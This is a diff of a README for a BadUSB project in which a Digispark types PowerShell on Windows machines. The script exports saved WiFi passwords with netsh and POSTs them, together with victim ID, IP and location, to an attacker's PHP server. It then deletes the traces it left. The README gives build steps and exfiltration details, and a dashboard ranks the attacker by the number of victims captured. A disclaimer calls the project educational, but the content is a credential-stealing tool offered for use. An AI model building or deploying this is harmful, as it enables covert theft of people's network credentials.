@@ -2,14 +2,73 @@
 
 A BadUSB payload that grabs WiFi credentials from Windows machines and displays them on a web dashboard.
 
-![Dashboard Preview](WEB_SERVER_PICTURE.png)
+> ⚠️ For educational and defensive security use only. Do not run this on machines or networks you do not own or have explicit permission to test.
+
+![Dashboard Preview](assets/dashboard_overview.png)
+
+---
 
 ## What it does
 
 - Attiny85/Digispark acts as a keyboard when plugged into Windows.
 - Runs PowerShell to extract saved WiFi passwords.
 - Sends everything to a PHP server on Kali or Windows.
-- Shows the captured data in a simple dashboard.
+- Shows the captured data in a web dashboard with:
+  - Session-based **login** protection.
+  - **Unique** capture counting (Victim ID + SSID + Password).
+  - Basic **ranking system** and password strength checks.
+
+---
+
+## Dashboard Features
+
+- **Login protection**
+
+  The dashboard is protected by a simple session-based login.
+
+  Default credentials are defined at the top of `index.php`:
+
+  ```php
+  $VALID_USER = 'admin';
+  $VALID_PASS = 'secret123';
+  ```
+
+  Change these before using it seriously.
+
+- **Duplicate filtering**
+
+  The dashboard only counts and displays unique captures based on:
+
+  - Victim ID  
+  - SSID  
+  - Password  
+
+  Any repeated capture with the same Victim ID + SSID + Password is ignored for stats and ranking.
+
+- **Ranking**
+
+  Your “rank” increases as you collect more unique captures:
+
+  - Rookie: 0–10 unique captures  
+  - Intermediate: 11–30 unique captures  
+  - Advanced: 31–100 unique captures  
+  - Expert: 100+ unique captures  
+
+  A progress bar shows how far you are inside your current tier.
+
+- **Password stats**
+
+  - Total captures (unique).  
+  - Weak password percentage (short / only letters / only digits).  
+  - Average password length.  
+  - Unique SSIDs and source IPs.
+
+- **CSV tools and filters**
+
+  - Export all captures to CSV.  
+  - Import captures from CSV.  
+  - Filter by Victim ID, SSID, IP, or OS.  
+  - Delete single entries or clear all history.
 
 ---
 
@@ -55,13 +114,15 @@ cat /var/www/html/wifi_creds.log
 
 If you see `data=test` in the output, the server is working.
 
-Open:
+Open in a browser:
 
 ```text
 http://YOUR_IP/index.php
 ```
 
 Replace `YOUR_IP` with the IP address of your Kali machine.
+
+You should see the login page first. Use the configured username and password to enter the dashboard.
 
 ---
 
@@ -107,17 +168,19 @@ Invoke-WebRequest -Uri 'http://localhost/wifi-recv.php' -Method POST -Body "data
 Get-Content C:\xampp\htdocs\wifi_creds.log
 ```
 
-Open:
+Open in a browser:
 
 ```text
 http://localhost/index.php
 ```
 
+Log in with your configured credentials to view the dashboard.
+
 ---
 
 ## Programming the Digispark
 
-![Attiny85 Digispark](attiny85-digispark.jpg)
+![Attiny85 Digispark](assets/attiny85-digispark.jpg)
 
 ### Getting Arduino IDE ready
 
@@ -147,12 +210,13 @@ payloads/wifi_stealer_digispark.ino
 $u='http://YOUR_IP/wifi-recv.php';
 ```
 
-Replace `YOUR_IP` with the IP of your Kali or Windows server (for example `http://YOUR_IP/wifi-recv.php` on your LAN).
+Replace `YOUR_IP` with the IP of your Kali or Windows server (for example `http://192.168.1.10/wifi-recv.php` on your LAN).
 
-3. Make sure the payload contains the Wi‑Fi extraction and POST logic that sends **raw CSV** to `wifi-recv.php`, in this format:
+3. Make sure the payload sends **raw CSV** to `wifi-recv.php` in this format:
 
 - Export Wi‑Fi profiles to `%TEMP%` using `netsh wlan export profile`.
-- Parse each `Wi-Fi-*.xml` file to build objects with properties: `Time, SSID, Pass, IP, OS`.
+- Parse each `Wi-Fi-*.xml` file to build objects with properties:  
+  `Time, VictimID, SSID, Pass, VictimLANIP, OS, PublicIP, LANextra, Lat, Lon, PacketSummary`.
 - Export these objects as CSV to something like `%TEMP%\w.csv`.
 - Use `Invoke-WebRequest` to POST the contents of that CSV as the body to `http://YOUR_IP/wifi-recv.php`.
 - Delete the XML and CSV files and exit PowerShell when done.
@@ -167,7 +231,7 @@ After flashing, plugging the Digispark into a Windows machine will:
 - Read saved WiFi profiles and extract the passwords.
 - Send the captured data to your PHP receiver as CSV.
 - Clean up the temp files it created.
-- Blink the onboard LED to signal it’s done.
+- Optionally blink the onboard LED to signal it’s done.
 
 ---
 
@@ -185,13 +249,15 @@ The dashboard is available at:
 http://YOUR_IP/index.php
 ```
 
-The dashboard shows:
+After login, the dashboard shows:
 
-- Total number of captures.
+- Total number of **unique** captures.
 - SSIDs and passwords.
-- Victim IP address.
+- Victim ID and IP address.
 - OS information.
-- A delete option for entries.
+- Weak vs ok password status.
+- Rank and progress bar.
+- Actions to delete a single entry or clear all history.
 
 ---
 
@@ -292,15 +358,13 @@ $profiles = (netsh wlan show profiles) |
   }
 ```
 
-This just finds lines containing `All User Profile`, splits on `:`, and trims the right side (the SSID).
-
-If you ever hit the null‑valued expression error, run the WiFi extraction commands step‑by‑step in a PowerShell window on your test machine, fix them there, then mirror the **exact** working commands back into the Digispark sketch.
+Run the WiFi extraction commands step‑by‑step in a PowerShell window on your test machine, fix them there, then mirror the working commands into the Digispark sketch.
 
 ---
 
 ### CSV looks good on Windows, but dashboard is still empty
 
-If `type` (or `Get-Content`) of your CSV on Windows shows valid data, but nothing appears in the dashboard:
+If `Get-Content` of your CSV on Windows shows valid data, but nothing appears in the dashboard:
 
 - Manually POST the CSV from PowerShell:
 
@@ -320,13 +384,6 @@ If this manual POST writes to the log, the PHP side is fine. Then the issue is:
 - Wrong IP/URL hard‑coded in the Digispark sketch, or
 - HID keystrokes being dropped because the Digispark is typing too fast.
 
-**Keystroke / timing tips:**
-
-- Add longer delays after heavy commands:
-  - 1500–4000 ms after the `netsh`/WiFi loop and `Export-Csv`
-  - 1500–2000 ms after `Invoke-WebRequest`
-- Avoid one huge PowerShell line if your Digispark becomes unreliable. Splitting the command into multiple logical lines, each sent by `DigiKeyboard.print(...)` + ENTER with a small delay, is more stable.
-
 ---
 
 ### Digispark upload fails or acts weird
@@ -334,16 +391,14 @@ If this manual POST writes to the log, the PHP side is fine. Then the issue is:
 - Plug the Digispark in **only after** you click **Upload** in Arduino IDE.
 - Try a different USB port or a short USB extension cable.
 - Confirm `Digispark (Default – 16.5 MHz)` is selected under **Tools → Board**.
-- Common compile issues:
-  - Make sure there is only one `.ino` in the sketch folder.
-  - Ensure `#include "DigiKeyboard.h"` is at the top of the file.
+- Make sure there is only one `.ino` in the sketch folder.
+- Ensure `#include "DigiKeyboard.h"` is at the top of the file.
 
 ---
 
-## Notes
-
-Ideas to improve it:
+## Notes / Future ideas
 
 - Better logging and timestamps.
-- Duplicate SSID filtering and history view.
-- Authentication and HTTPS for the dashboard.
+- Per‑victim history and more detailed stats.
+- Stronger authentication (hashed passwords, multiple users).
+- HTTPS for the dashboard.
